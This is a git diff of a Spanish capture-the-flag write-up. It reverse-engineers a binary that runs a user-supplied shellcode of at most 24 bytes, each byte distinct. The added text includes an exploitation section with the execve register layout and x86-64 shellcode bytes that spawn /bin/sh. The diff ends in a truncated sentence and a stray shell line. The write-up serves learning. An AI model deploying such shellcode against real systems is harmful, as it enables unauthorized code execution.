@@ -59,7 +59,7 @@ Como vemos son 0x34 (bytes) si restamos las posiciones de memoria:
 ```
    0x555555554f1c-0x555555554ee8=0x34 (el número de bytes que copia en hexadecimal)
 ```
-Entonces tenemos un código que nos va a limpiar todos los registros y va a reservar 0x1000 bytes en la pila.
+Entonces tenemos un código que nos va a limpiar todos los registros y va a reservar 0x1000 bytes en la pila, esto importante para luego preparar nuestro shellcode.
 
 Si seguimos con la función main te va a pedir que introduzcas tu shellcode o código:
 
@@ -69,6 +69,7 @@ mov     eax, 0
 ```
 
 Si seguimos más adelante llama a una función para comprobar ese código que le hemos pasado:
+
 ```asm
 mov     [rbp+var_2040], rax
 mov     rdx, [rbp+var_2040]
@@ -79,12 +80,16 @@ call    sub_C38
 test    eax, eax
 jz      short loc_E3F
 ```
+
 Si miramos en la función 'sub_C38':
+
 ```asm
 cmp     [rbp+var_40], 18h  <--- Comprueba que el código pasado no supere los 24 bytes
 jbe     short loc_C74
 ```
+
 Luego mediante dos bucles anidadados va comprobando que cada byte de los 24 sea diferente, devuelve 0 si hay alguno igual y 1 si todos son diferentes:
+
 ```
 signed __int64 __fastcall sub_C38(char *a1, unsigned __int64 a2)
 {
@@ -121,7 +126,9 @@ LABEL_13:
   return result;
 }
 ```
+
 De vuelta a la función main dependiendo del resultado sigue ejecutándose o se sale:
+
 ```asm
 call    sub_C38
 test    eax, eax
@@ -134,7 +141,9 @@ call    puts
 mov     edi, 0FFFFFFFDh ; status
 call    _exit
 ```
-Si es 1, sigue la ejecucción:
+
+Si es 1, sigue la ejecucción, y lo que hace es añadir nuestro shellcode detrás del shellcode que ya existe hardcodeado:
+
 ```asm
 mov     rax, cs:dest
 add     rax, 34h
@@ -153,7 +162,31 @@ nop
 mov     rax, [rbp+var_8]
 xor     rax, fs:28h
 jz      short locret_E5A
+```
+
+Entonces terminando con el reversing, tendríamos su código y el nuestro seguidos. Ahora hay que pensar que shellcode de 24 bytes le pasamos que no sea ningún byte igual y que nos permita ejecutar una shell para leer la flag.
+
+# **Exploiting**
+
+Aquí básicamente va a ser un copia y pega de la solución del enlace.
+
+Para lograr ejecutar un /bin/sh, haciendo una llamada a la función execve hay que tener los siguientes valores en estos registros:
+```
+| %rax          | system call | %rdi                | %rsi                    | %rdx                    |
+| ------------- |-------------|---------------------|-------------------------|-------------------------|
+|59	        |sys_execve   |const char *filename | const char *const argv[]|	const char *const envp[]|		
+
+```
+En ensamblador quedaría así:
+
+
 ```asm
+68 2f 73 68 00      push   0x0068732f   ; 1. '/sh\x00'
+68 2f 62 69 6e      push   0x6e69622f   ; 1. '/bin'
+48 89 e7            mov    rdi, rsp      ; 2. Put the '/bin//sh' addr in rdi
+b0 3b               mov    al, 0x3b      ; 5. Mov to rax the execve syscall number
+0f 05               syscall             ; 5. call it
+```
 
 Vale la pena detenerse en la
 cat otro.asm 
